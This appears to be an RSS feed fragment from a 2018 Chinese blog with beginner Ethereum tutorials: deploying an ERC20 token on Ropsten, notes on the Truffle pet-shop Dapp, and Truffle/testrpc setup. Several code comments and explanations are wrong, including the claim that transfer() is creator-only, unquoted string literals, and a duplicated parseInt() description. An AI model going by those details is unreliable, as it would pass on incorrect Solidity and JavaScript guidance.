    </item>
    
    <item>
      <title>发行自己的ERC20 Token</title>
      <link>https://www.diglp.xyz/2018/02/12/BC_%E5%8F%91%E8%A1%8C%E8%87%AA%E5%B7%B1%E7%9A%84ERC20%20Token/</link>
      <guid>https://www.diglp.xyz/2018/02/12/BC_%E5%8F%91%E8%A1%8C%E8%87%AA%E5%B7%B1%E7%9A%84ERC20%20Token/</guid>
      <pubDate>Sun, 11 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;这次主要实现 发行一个自己的ERC20 标准的 Token. (然后进行ICO, 圈钱跑路, 走上人生巅峰,XD)&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;其实把Token 叫做代币, 容易让人产生误解.实际上是一种凭证,
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>这次主要实现 发行一个自己的ERC20 标准的 Token. (然后进行ICO, 圈钱跑路, 走上人生巅峰,XD)</p><blockquote><p>其实把Token 叫做代币, 容易让人产生误解.实际上是一种凭证, 只是被现在狂热的人们搅浑了.</p><p>Token的持有人可以完全控制资产，遵守ERC20的token可以跟踪任何人在任何时间拥有多少token.</p></blockquote><h2 id="前"><a href="#前" class="headerlink" title="前"></a>前</h2><p>现在币圈的狂热之势四起, 昨天一个朋友, 发来一串神秘代码, 说转账有 3000多的糖果.<br>这里偷偷的放一下地址, 可以去玩玩..</p><blockquote><p>ENU: 0x275b69AA7c8C1d648A0557656bCe1C286e69a29d</p></blockquote><p><img src="/images/tx.png" alt="Tx"></p><p>这个转账记录还真是来势汹汹. 然后就好奇的 用<span class="exturl" data-url="aHR0cHM6Ly9ldGhlcnNjYW4uaW8vYWRkcmVzcy8weDI3NWI2OWFhN2M4YzFkNjQ4YTA1NTc2NTZiY2UxYzI4NmU2OWEyOWQjY29kZQ==" title="https://etherscan.io/address/0x275b69aa7c8c1d648a0557656bce1c286e69a29d#code">浏览器<i class="fa fa-external-link"></i></span> 看了看合约代码</p><pre><code>string public constant name = &quot;Enumivo&quot;;string public constant symbol = &quot;ENU&quot;;uint public constant decimals = 8;uint256 public totalSupply = 1000000000e8;uint256 public totalDistributed = 100000000e8;uint256 public totalRemaining = totalSupply.sub(totalDistributed);uint256 public value;</code></pre><p>这个 <code>totalSupply</code> 是不是相当惊人… 这个估计是用来测试的合约, 不知道被谁发现了来.</p><p>所以, 这玩意这么火, 这次就自己实现一个!</p><h2 id="ERC20-Token标准"><a href="#ERC20-Token标准" class="headerlink" title="ERC20 Token标准"></a>ERC20 Token标准</h2><p>实现这样的一个token 实际上还是使用Solidity语言编写的合约来实现, 只是合约的形式符合了ERC20 的标准. 这样就可以被区块浏览器识别成一个 Token.</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2V0aGVyZXVtL0VJUHMvYmxvYi9tYXN0ZXIvRUlQUy9laXAtMjAubWQ=" title="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md">官方标准 ERC-20 Token Standard<i class="fa fa-external-link"></i></span></p></blockquote><p>手册里说明了代码的应有的函数和成员 (看E文 还是难受, 找到了一篇译文, 不过是机翻的, 看着玩吧)</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2Jsb2cuY3Nkbi5uZXQvZGlhbmRpYW54aXl1X2dlZWsvYXJ0aWNsZS9kZXRhaWxzLzc4MDgyNTUxP3V0bV9zb3VyY2U9Z29sZF9icm93c2VyX2V4dGVuc2lvbg==" title="http://blog.csdn.net/diandianxiyu_geek/article/details/78082551?utm_source=gold_browser_extension">以太坊ERC20 Token标准完整说明<i class="fa fa-external-link"></i></span></p></blockquote><p>合约的框架如下</p><pre><code>// https://github.com/ethereum/EIPs/issues/20// 接口标准  contract ERC20 {      function totalSupply() constant returns (uint totalSupply);    // 总发行量      function balanceOf(address _owner) constant returns (uint balance);      function transfer(address _to, uint _value) returns (bool success);    // 代币分发(注意, 这个只有合约的Creator 可以调用)      function transferFrom(address _from, address _to, uint _value) returns (bool success);    // 这里是拥有者和拥有者之间的代币转移      function approve(address _spender, uint _value) returns (bool success);      function allowance(address _owner, address _spender) constant returns (uint remaining);      event Transfer(address indexed _from, address indexed _to, uint _value);      event Approval(address indexed _owner, address indexed _spender, uint _value);// Token信息     string public constant name = &quot;4FunCoin&quot;;    string public constant symbol = &quot;4FC&quot;;    uint8 public constant decimals = 18;  // token的精度, 大部分都是18}</code></pre><h2 id="Token实现代码"><a href="#Token实现代码" class="headerlink" title="Token实现代码"></a>Token实现代码</h2><p>下面就是自己的token的实现代码, 其实我们根据官方的合约框架进行填充, 这里对代码进行注解. </p><pre><code>pragma solidity ^0.4.16;interface tokenRecipient { function receiveApproval(address _from, uint256 _value, address _token, bytes _extraData) public; }    // token的 接受者 这里声明接口, 将会在我们的ABI里contract TokenERC20 {/*********Token的属性说明************/    string public name = 4FunCoin;    string public symbol = 4FC;    uint8 public decimals = 18;  // 18 是建议的默认值    uint256 public totalSupply;    // 发行量    // 建立映射 地址对应了 uint&apos; 便是他的余额    mapping (address =&gt; uint256) public balanceOf;           // 地址对应余额    mapping (address =&gt; mapping (address =&gt; uint256)) public allowance;    event Transfer(address indexed from, address indexed to, uint256 value);    event Burn(address indexed from, uint256 value);    // 这里是构造函数, 实例创建时候执行    function TokenERC20(uint256 initialSupply, string tokenName, string tokenSymbol) public {        totalSupply = initialSupply * 10 ** uint256(decimals);    // 这里确定了总发行量        balanceOf[msg.sender] = totalSupply;    // 这里就比较重要, 这里相当于实现了, 把token 全部给合约的Creator        name = tokenName;        symbol = tokenSymbol;    }    // token的发送函数    function _transfer(address _from, address _to, uint _value) internal {        require(_to != 0x0);    // 不是零地址        require(balanceOf[_from] &gt;= _value);        // 有足够的余额来发送        require(balanceOf[_to] + _value &gt; balanceOf[_to]);    // 这里也有意思, 不能发送负数的值(hhhh)        uint previousBalances = balanceOf[_from] + balanceOf[_to];    // 这个是为了校验, 避免过程出错, 总量不变对吧?        balanceOf[_from] -= _value;    //发钱 不多说        balanceOf[_to] += _value;        Transfer(_from, _to, _value);    // 这里触发了转账的事件 , 见上event        assert(balanceOf[_from] + balanceOf[_to] == previousBalances);    // 判断总额是否一致, 避免过程出错    }    function transfer(address _to, uint256 _value) public {        _transfer(msg.sender, _to, _value);    // 这里已经储存了 合约创建者的信息, 这个函数是只能被合约创建者使用    }    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {        require(_value &lt;= allowance[_from][msg.sender]);     // 这句很重要, 地址对应的合约地址(也就是token余额)        allowance[_from][msg.sender] -= _value;        _transfer(_from, _to, _value);        return true;    }    function approve(address _spender, uint256 _value) public        returns (bool success) {        allowance[msg.sender][_spender] = _value;    // 这里是可花费总量        return true;    }    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {        tokenRecipient spender = tokenRecipient(_spender);        if (approve(_spender, _value)) {            spender.receiveApproval(msg.sender, _value, this, _extraData);            return true;        }    }    // 正如其名, 这个是烧币(SB)的.. ,用于后面把多token 烧掉    function burn(uint256 _value) public returns (bool success) {        require(balanceOf[msg.sender] &gt;= _value);    // 必须要有这么多        balanceOf[msg.sender] -= _value;        totalSupply -= _value;        Burn(msg.sender, _value);        return true;    }    // 这个是用户自焚.....    function burnFrom(address _from, uint256 _value) public returns (bool success) {        require(balanceOf[_from] &gt;= _value);        // 一样要有这么多        require(_value &lt;= allowance[_from][msg.sender]);    //         balanceOf[_from] -= _value;        allowance[_from][msg.sender] -= _value;        totalSupply -= _value;        Burn(_from, _value);        return true;    }}</code></pre><p>通过以上代码,就算是实现了一个符合ERC20 标准的Token, 通过读代码,也是学到了其具体实现, 代码的总结,在后面实现吧.<br>这次主要是实现这个token的部署.</p><h2 id="Token合约部署"><a href="#Token合约部署" class="headerlink" title="Token合约部署"></a>Token合约部署</h2><p>上面实现了一个token的代码, 现在需要的是把他部署到以太坊网络上去.<br>这里我们使用官方的IDE <span class="exturl" data-url="aHR0cHM6Ly9yZW1peC5ldGhlcmV1bS5vcmc=" title="https://remix.ethereum.org">REMIX<i class="fa fa-external-link"></i></span></p><blockquote><p>环境:</p><ul><li>firefox</li><li><span class="exturl" data-url="aHR0cHM6Ly9yZW1peC5ldGhlcmV1bS5vcmc=" title="https://remix.ethereum.org">REMIX<i class="fa fa-external-link"></i></span></li><li>mateMask</li></ul></blockquote><p>由于实际上我们的合约部署是需要消耗ether的, 所以这里我们选择以太坊的测试网络, 这样不会消耗主网资源, 利国利民</p><h3 id="创建测试钱包"><a href="#创建测试钱包" class="headerlink" title="创建测试钱包"></a>创建测试钱包</h3><p><img src="/images/ropsten.png" alt="ropsten"></p><p>这里已经在ropsten网络上创建了一个钱包, 注意左上角的网络选择是 Ropsten网络就好, 然后我们创建自己的钱包, 这个很简单, 就不多讲</p><p>现在钱包是有了, 没币呀. 不慌! 没币,我们要去, 由于是测试网络, 所以这些东西就很随便了, 有水龙头,给我们免费发放!</p><blockquote><p><span class="exturl" data-url="aHR0cDovL2ZhdWNldC5yb3BzdGVuLmJlOjMwMDEv" title="http://faucet.ropsten.be:3001/">Ethereum Ropsten Faucet<i class="fa fa-external-link"></i></span></p></blockquote><p>直接在上面的地址直接领就好, (要是现在的行情, 点一下7000块呢 嘿嘿嘿)</p><h3 id="编译合约代码"><a href="#编译合约代码" class="headerlink" title="编译合约代码"></a>编译合约代码</h3><p>打开我们的在线IDE,  贴上代码</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9yZW1peC5ldGhlcmV1bS5vcmc=" title="https://remix.ethereum.org">REMIX<i class="fa fa-external-link"></i></span></p></blockquote><p><img src="/images/run.png" alt="RUN"></p><p>上面会自动识别成 injected web3 (实际上这个js 是matemask在网页进行注入了)</p><p><code>Create</code>前面就是我们创建合约的构造函数的参数, 从左到右是发行量, 名字, 和 符号</p><pre><code>1000, &quot;AnFun&quot;, &quot;AFC&quot;</code></pre><p>之后点击创建,会弹出mateMask的支付请求</p><p><img src="/images/pay.png" alt="pay"></p><blockquote><p>画外音:这里可见, 整个过程只用消耗GAS的费用, 可谓相当低 , 然而就这样的东西, 堂而皇之的被各种利用, 成空气币!!!</p></blockquote><p>点击提交(submit), 我们会看到我们的支付记录,</p><p><img src="/images/txlog.png" alt="Txhash"></p><p>可见, 合约已经创建!</p><h3 id="Token的添加和交易"><a href="#Token的添加和交易" class="headerlink" title="Token的添加和交易"></a>Token的添加和交易</h3><p>打开我们的小狐狸, 在token的选项中, 点击添加token, 把我们的合约地址(见上图)填入, 自动的识别我们的信息, 再次刷新可见, 我的token 已经到手了!(圈钱跑路去 2333).</p><blockquote><p>0xc67Cc41C6517d97df3DD1eCC7885c209fE04bFa8 这里给出地址, 想要的免费空投 2333</p></blockquote><p><img src="/images/tokens.png" alt="tokens"></p><p>现在我们有了token了, 下面进行交易, 这里是使用</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly93d3cubXlldGhlcndhbGxldC5jb20=" title="https://www.myetherwallet.com">MY_WALLET<i class="fa fa-external-link"></i></span>    这个可不是钱包, 只是一个在线的接口</p></blockquote><p>同样的确认网络一直, 找到Token 即可!</p><h2 id="后面的话"><a href="#后面的话" class="headerlink" title="后面的话"></a>后面的话</h2><p>也是通过这样的一篇文章可见, 有些所谓的token是多么的黑暗.<br>参考出处</p><blockquote><p><span class="exturl" data-url="aHR0cHM6Ly9sZWFybmJsb2NrY2hhaW4uY24vMjAxOC8wMS8xMi9jcmVhdGVfdG9rZW4vI21vcmU=" title="https://learnblockchain.cn/2018/01/12/create_token/#more">代码参考<i class="fa fa-external-link"></i></span></p></blockquote><p>这里自己也是学习, 并且加上了注释. 在下一篇, 详细的写写上述代码的 Solidity的知识</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/12/BC_%E5%8F%91%E8%A1%8C%E8%87%AA%E5%B7%B1%E7%9A%84ERC20%20Token/#disqus_thread</comments>
    </item>
    
    <item>
      <title>宠物商店Dapp 学习笔记</title>
      <link>https://www.diglp.xyz/2018/02/11/%E5%AE%A0%E7%89%A9%E5%95%86%E5%BA%97(pet-shop)%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
      <guid>https://www.diglp.xyz/2018/02/11/%E5%AE%A0%E7%89%A9%E5%95%86%E5%BA%97(pet-shop)%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
      <pubDate>Sat, 10 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;truffle 可以算是一个超级强大的 Ethereum 开发工具集, 集各种的功能集一身, 今天, 照着官方的文档, 和 手把手的教程, 完成了其中提供的一个demo.&lt;/p&gt;
&lt;h2 id=&quot;truffle的目录结构&quot;&gt;&lt;a href=&quot;#truffle的目录结构&quot;
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p>truffle 可以算是一个超级强大的 Ethereum 开发工具集, 集各种的功能集一身, 今天, 照着官方的文档, 和 手把手的教程, 完成了其中提供的一个demo.</p><h2 id="truffle的目录结构"><a href="#truffle的目录结构" class="headerlink" title="truffle的目录结构"></a>truffle的目录结构</h2><h3 id="目录树"><a href="#目录树" class="headerlink" title="目录树"></a>目录树</h3><pre><code>demo├── build│   └── contracts│       ├── Migrations.json│       └──  Adoption.json├── contracts│   ├── Migrations.sol│   └── Adoption.sol├── migrations│   └── 1_initial_migration.js├── truffle-config.js├── truffle.js├── test│   └──1_initial_migration.js└── src    └── ...</code></pre><p>​    </p><ul><li>contract  此目录就是我们的编写的智能合约所存在的目录, 使用solidity语言编写</li><li>migrations 此目录下是用于迁移部署合约的JS的脚本</li><li>test 测试合约时所用的测试脚本</li><li>src 一个前端的实现, 主要是调用 wed3 的库, 与节点服务器进行RPC</li></ul><h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><h3 id="合约代码"><a href="#合约代码" class="headerlink" title="合约代码"></a>合约代码</h3><pre><code>pragma solidity ^0.4.17;contract Adoption {  address[16] public adopters;  // 保存领养者的地址  /**func: 领养宠物 para: 领养宠物ID */  function adopt(uint petId) public returns (uint) {      require(petId &gt;= 0 &amp;&amp; petId &lt;= 15);  // 确保id在数组长度内    adopters[petId] = msg.sender;        // 保存调用这地址     return petId; //返回当前宠物ID  }  // 返回领养者  function getAdopters() public view returns (address[16]) {    return adopters;  }}</code></pre><p>以上是实现宠物领养的合约代码.</p><ul><li>指定编译器版本</li><li><p>定义 Adoption 的合约结构</p><pre><code>contract {...}</code></pre></li><li>定义一个存放地址的定长数组</li><li>定义合约函数 adopt<ul><li>Public类型, 可以被外部访问, uint参数 为调用时传入的要领养的宠物的ID, 返回值就是当前领养的宠物id</li><li><code>require()</code> 用于检查变量值是否满足当前条件,  不满足条件则立即抛出异常, 并且对所有的已做修改进行回滚(revert)</li><li>使用数组的对应的 ID index 来保存领养者的地址</li></ul></li><li>定义合约函数 <code>getAdopters()</code> <ul><li>直接返回 存储领养者的定长数组</li></ul></li></ul><h3 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h3><p>truffle 作为一个集成的环境, 也是很好的提供了合约测试的功能 </p><pre><code>pragma solidity ^0.4.17;import &quot;truffle/Assert.sol&quot;;   // 引入的断言文件import &quot;truffle/DeployedAddresses.sol&quot;;  // 用来获取被测试合约的地址// 上面两个文件是Truffle框架提供, 本身并没有import &quot;../contracts/Adoption.sol&quot;;      // 被测试合约, 这样才能调用它//这个合约是用来测试合约的, 每个用例都会被执行, 通过断言判断是否有问题contract TestAdoption {  Adoption adoption = Adoption(DeployedAddresses.Adoption());  // 领养测试用例  function testUserCanAdoptPet() public {    uint returnedId = adoption.adopt(8);    // 这里传入是8 返回也应该是8    uint expected = 8;    Assert.equal(returnedId, expected, &quot;Adoption of pet ID 8 should be recorded.&quot;);  }  // 宠物所有者测试用例  function testGetAdopterAddressByPetId() public {    // 期望领养者的地址就是本合约地址，因为交易是由测试合约发起交易，    address expected = this;    address adopter = adoption.adopters(8);    // 当前地址和返回地址的判断, adopters明明是Array啊, 还能这样?    Assert.equal(adopter, expected, &quot;Owner of pet ID 8 should be recorded.&quot;);  }    // 测试所有领养者  function testGetAdopterAddressByPetIdInArray() public {  // 领养者的地址就是本合约地址    address expected = this;    address[16] memory adopters = adoption.getAdopters(); // 内存分配,不是storage    Assert.equal(adopters[8], expected, &quot;Owner of pet ID 8 should be recorded.&quot;);  }}// 关于 this的使用, this代表当前合约, 也是ADDRESS</code></pre><p>代码分析写在了注释里面 , 下面是执行结果</p><pre><code>&gt; truffle testUsing network &apos;development&apos;.Compiling ./contracts/Adoption.sol...Compiling ./test/TestAdoption.sol...Compiling truffle/Assert.sol...Compiling truffle/DeployedAddresses.sol...</code></pre><p>​<br>      TestAdoption<br>        ✓ testUserCanAdoptPet (113ms)<br>        ✓ testGetAdopterAddressByPetId (110ms)<br>        ✓ testGetAdopterAddressByPetIdInArray (196ms)</p><p>​<br>      3 passing (1s)</p><p>可见, 通过测试命令, Truffle 对每个函数进行自动的 测试, 对运行结果进行assert(断言)分析, 如果合约代码存在问题, 测试过程会把错误显示出. 这里是全部测试通过的情况.</p><h3 id="前端应用代码"><a href="#前端应用代码" class="headerlink" title="前端应用代码"></a>前端应用代码</h3><p>奈何 没接触过JS 所以看起来有些吃力, 也算是借这个学习一下了!</p><p>代码主体存在于 <code>src/js/app.js</code> , 从功能上讲就是对 我们的合约进行调用, 把我们领养的宠物这个信息记录在区块里.</p><h4 id="InitWeb3"><a href="#InitWeb3" class="headerlink" title="InitWeb3"></a>InitWeb3</h4><pre><code>initWeb3: function () {  // 是否当前浏览器提供web3(如 metaMask)?  if (typeof web3 !== &apos;undefined&apos;) {    App.web3Provider = web3.currentProvider;    //如果是就直接使用当前的  } else {    // 如果没有插件提供的web3, 就向本地的节点要一个    App.web3Provider = new Web3.providers.HttpProvider(&apos;http://localhost:7545&apos;);  }  web3 = new Web3(App.web3Provider);  return App.initContract();    // 调用后续},</code></pre><p>这个是web3这个JS包的初始化代码,代码中优先使用Mist 或 MetaMask提供的web3实例，如果没有则从本地环境创建一个。</p><h4 id="InitContract"><a href="#InitContract" class="headerlink" title="InitContract"></a>InitContract</h4><pre><code>initContract: function () {  $.getJSON(&apos;Adoption.json&apos;, function (data) {    // 用Adoption.json数据创建一个可交互的TruffleContract合约实例。    var AdoptionArtifact = data;    App.contracts.Adoption = TruffleContract(AdoptionArtifact);    // Set the provider for our contract    App.contracts.Adoption.setProvider(App.web3Provider);    // Use our contract to retrieve and mark the adopted pets    return App.markAdopted();    //进行回调,所以先执行这个  });  return App.bindEvents();},</code></pre><p>这里实现了合约的初始化, 这里加载了Adoption.json，保存了Adoption的ABI（接口说明）信息及部署后的网络(地址)信息，它在编译合约的时候生成ABI，在部署的时候追加网络信息. </p><blockquote><p>画外音: 这里也是展现了NodeJs的一切皆回调的 异步属性 , 中间部分的代码就是我们执行GetJson的 回调代码.(不同于同步(顺序)编程)</p></blockquote><h4 id="MarkAdopted"><a href="#MarkAdopted" class="headerlink" title="MarkAdopted"></a>MarkAdopted</h4><pre><code>markAdopted: function(adopters, account) {var adoptionInstance;App.contracts.Adoption.deployed().then(function(instance) {  adoptionInstance = instance;      // 这里部署了合约, 并且保存该合约的实例      // 调用合约的getAdopters(), 用call读取信息不用消耗gas, 返回领养者的array  return adoptionInstance.getAdopters.call();}).then(function(adopters) {    // 得到领养者列表之后, 这里进行遍历, 如果发现有存在合理的领养者(if), 改变前端的按钮样式吧(应该)  for (i = 0; i &lt; adopters.length; i++) {    if (adopters[i] !== &apos;0x0000000000000000000000000000000000000000&apos;) {      $(&apos;.panel-pet&apos;).eq(i).find(&apos;button&apos;).text(&apos;Success&apos;).attr(&apos;disabled&apos;, true);    }  }}).catch(function(err) {  console.log(err.message);      //这里捕获异常, 并且log出来});},</code></pre><blockquote><p>画外音 : then 也是一种回调用法, 在前一函数执行完之后, 才会进行 then 内的函数, 这样就确保了数据的完整获得</p></blockquote><p>这里实现了 合约的部署, 和对已经领养的dog进行标记, 遍历数组得到, 这个判断方式值得学习.</p><h4 id="绑定事件"><a href="#绑定事件" class="headerlink" title="绑定事件"></a>绑定事件</h4><pre><code>bindEvents: function() {   $(document).on(&apos;click&apos;, &apos;.btn-adopt&apos;, App.handleAdopt); },</code></pre><p>这个地方就是通俗易懂了,把按钮点击的事件, 和它的服务函数(handle), 绑定起来.</p><blockquote><p>画外音: JavaScript 是一种事件驱动的语言, 所以, 这里和QT很相似, 也是事件驱动, 用户的点击, 产生事件, 之后调用事件的处理函数,区别于 消息驱动(如MFC)</p></blockquote><h4 id="服务函数"><a href="#服务函数" class="headerlink" title="服务函数"></a>服务函数</h4><pre><code>handleAdopt: function(event) {   event.preventDefault();   var petId = parseInt($(event.target).data(&apos;id&apos;));   var adoptionInstance;   // 获取用户账号.调用Web3   web3.eth.getAccounts(function(error, accounts) {     // 出常的回调     if (error) {       console.log(error);     }     var account = accounts[0];   // 创建合约实例             App.contracts.Adoption.deployed().then(function(instance) {       adoptionInstance = instance;       // 发送交易领养宠物       return adoptionInstance.adopt(petId, {from: account});    执行领养函数     }).then(function(result) {       return App.markAdopted();    // 标记所领养宠物     }).catch(function(err) {       console.log(err.message);     });   }); }</code></pre><p>这里就是, 鼠标点击事件的服务函数.  当鼠标点击Button的时候事件触发, 服务函数被回调.<br>&gt;<br>&gt;<br>&gt;</p><blockquote><ul><li><p>event.preventDefault()    </p><p> 该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）。避免服务函数被中断</p></li><li><p>parseInt()</p><p> 该方法将通知 Web 浏览器不要执行与事件关联的默认动作（如果存在这样的动作）</p></li></ul></blockquote><h2 id="写在后面"><a href="#写在后面" class="headerlink" title="写在后面"></a>写在后面</h2><p>这次是个简单的demo的实现和分析,也得上是第一个Dapp的实现 </p><p>这个Demo 的实现参照博文</p><p><span class="exturl" data-url="aHR0cHM6Ly9sZWFybmJsb2NrY2hhaW4uY24vMjAxOC8wMS8xMi9maXJzdC1kYXBwLw==" title="https://learnblockchain.cn/2018/01/12/first-dapp/">一步步教你开发、部署第一个去中心化应用(Dapp) - 宠物商店<i class="fa fa-external-link"></i></span></p><p>也感谢博主的OFS的开源精神!(保留版权声明)</p>]]></content:encoded>
      
      <comments>https://www.diglp.xyz/2018/02/11/%E5%AE%A0%E7%89%A9%E5%95%86%E5%BA%97(pet-shop)%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/#disqus_thread</comments>
    </item>
    
    <item>
      <title>智能合约 HelloWorld</title>
      <link>https://www.diglp.xyz/2018/02/09/ETH%20%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%20helloworld/</link>
      <guid>https://www.diglp.xyz/2018/02/09/ETH%20%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%E5%8F%8A%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%20helloworld/</guid>
      <pubDate>Thu, 08 Feb 2018 16:00:00 GMT</pubDate>
      <description>
      
        
        
          
          
            &lt;p&gt;&lt;img src=&quot;http://www.ethdocs.org/en/latest/_images/cpp_35k9.png&quot; alt=&quot;CPP&quot;&gt;    &lt;img
          
        
      
      </description>
      
      <content:encoded><![CDATA[<p><img src="http://www.ethdocs.org/en/latest/_images/cpp_35k9.png" alt="CPP">    <img src="http://www.ethdocs.org/en/latest/_images/ETHEREUM-ICON_Black.png" alt="logo"></p><p><strong>自己的菜鸟级的起步教程,也算是给自己给自己长记性</strong></p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><h3 id="什么是以太坊"><a href="#什么是以太坊" class="headerlink" title="什么是以太坊"></a>什么是以太坊</h3><p><span class="exturl" data-url="aHR0cDovL2V0aGZhbnMub3JnL3Bvc3RzL2V0aGVyZXVtLXdoaXRlcGFwZXI=" title="http://ethfans.org/posts/ethereum-whitepaper">以太坊白皮书_ZH<i class="fa fa-external-link"></i></span></p><p><a href="">以太坊白皮书_EN</a></p><h3 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h3><p>这里使用了,以下两个开发工具</p><ul><li>truffle</li><li>testrpc </li></ul><p>Truffle 是一个基于js 开发的 以太坊开发框架,其集成很多开发功能及一身, 能够在本地编译, 部署智能合约, 并且可以通过console 对节点进行 rpc 。</p><p>testrpc 严格意义上是一个节点模拟工具(调试环境), 打开本地端口后, 其数据存在内存中, 不在硬盘的数据库内(不同于 geth ,mist ) 用于测试合约很方便,<br>(如果在geth 上测试合约,需要自己开私链,还是方便了不少)</p><h3 id="工具安装"><a href="#工具安装" class="headerlink" title="工具安装"></a>工具安装</h3><h4 id="truffle-安装"><a href="#truffle-安装" class="headerlink" title="truffle 安装"></a>truffle 安装</h4><p>truffle 是node.js工程<br>所以先安装 <span class="exturl" data-url="aHR0cDovL25vZGVqcy5jbg==" title="http://nodejs.cn">node.js<i class="fa fa-external-link"></i></span> </p><p>安装环境后 console 执行</p><pre><code>npm install -g truffle        #可能需要权限</code></pre><p>安装完成后执行</p><pre><code>truffle version</code></pre><p>回显</p><pre><code>Truffle v4.0.5 (core: 4.0.5)Solidity v0.4.18 (solc-js)</code></pre><p>如上安装成功</p><p><strong>这个框架在激烈的开发中,所以不同版本,可能出入大,(反正我是支持支持最新版!)</strong></p><h4 id="testrpc-安装"><a href="#testrpc-安装" class="headerlink" title="testrpc 安装"></a>testrpc 安装</h4><pre><code>npm install -g ethereumjs-testrpc</code></pre><p>也是js 开发,所以,一键安装它<br>执行后,回显如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">EthereumJS TestRPC v6.0.3 (ganache-core: 2.0.2)</span><br><span class="line"></span><br><span class="line">Available Accounts</span><br><span class="line">==================</span><br><span class="line">(0) 0x819d0cce264d8c7028f079f828ec44ad50ab6f1f</span><br><span class="line">(1) 0xa0eb8d663514aed055c26fdfa02082f283e3814b</span><br><span class="line">(2) 0x083c2e3debbd83e7193d430c95cb65dfac38be2e</span><br><span class="line">(3) 0xa268de20bc84f2a371f46e71dd51a437fd0b2b8a</span><br><span class="line">(4) 0x6a183c520fac524984ff620f6962e758b0a72d3c</span><br><span class="line">(5) 0xe365cc8ef2ab2bc1bc4d6bbda83a8abb589239cc</span><br><span class="line">(6) 0x179aa33ae7918af15c956d8b2c8e784004da30e7</span><br><span class="line">(7) 0x596a67f06884c15ffe9c8767b698730791d6a80d</span><br><span class="line">(8) 0x318bb06f46a24a322a2a0a173712b630a41f8755</span><br><span class="line">(9) 0xe1b157fed1cbd523538ed0785bbafef2bb5b5aa5</span><br><span class="line"></span><br><span class="line">Private Keys</span><br><span class="line">==================</span><br><span class="line">(0) 660f587668641256e4ad353e0a2df52f02524c41641ea3e55aa4ad28300f3c63</span><br><span class="line">(1) 1ff553362355f36b2d2c3bcef0487cbf4a0db041eeab71e00c6bfb5b43a82e67</span><br><span class="line">(2) bd10b1b76af76ab8a02a9299efd9ff3cafff68a6af0adf4b7e1ff83abc50b479</span><br><span class="line">(3) 673ee36f18ee7d58ce0ddfd78b4a584c9b2f12be4c7860d813e9e906582aba15</span><br><span class="line">(4) 794e336225d007e6a3fbd06a60d087fd0a0380fb04a39adbc066e765c676a105</span><br><span class="line">(5) c7cd161d995caf782f90ac51e86aa9acece2dbf2f95e1fa0ddd286c98dcbe6ec</span><br><span class="line">(6) 9058ad2690b7db693675badc61388fe563b6b35e800e02e760e8b3a681660470</span><br><span class="line">(7) 5b343a275911d1cb644ef55081feabc5d40fce12e1036b2f2eb3c639763e2f7a</span><br><span class="line">(8) fb237a23e02e29711e7050f394c09bdee3d7818ab91dfcb82501773a80b61c5a</span><br><span class="line">(9) f6f62f1d1ef0811a9f2c63cde211fc2a57032a4752505cee8e18caa85ff94339</span><br><span class="line"></span><br><span class="line">HD Wallet</span><br><span class="line">==================</span><br><span class="line">Mnemonic:      rose april chef waste mule setup coffee icon upper news amused lecture</span><br><span class="line">Base HD Path:  m/44&apos;/60&apos;/0&apos;/0/&#123;account_index&#125;</span><br><span class="line"></span><br><span class="line">Listening on localhost:8545</span><br></pre></td></tr></table></figure><p>会自动的分配我们十个地址,用于测试, 打开8545 rpc端口</p><h3 id="环境测试"><a href="#环境测试" class="headerlink" title="环境测试"></a>环境测试</h3><p>先启动节点 testrpc</p><pre><code>testrpc</code></pre><p>之后启动truffle的rpc命令行</p><pre><code>truffle console        #可能会有网络问题,见后</code></pre><p>当终端1出现</p><pre><code>truffle(development)&gt;</code></pre><p>说明已经,正常接入rpc控制台</p><p>执行命令</p><pre><code>truffle(development)&gt; web3.eth.accounts[ &apos;0x819d0cce264d8c7028f079f828ec44ad50ab6f1f&apos;,  &apos;0xa0eb8d663514aed055c26fdfa02082f283e3814b&apos;,  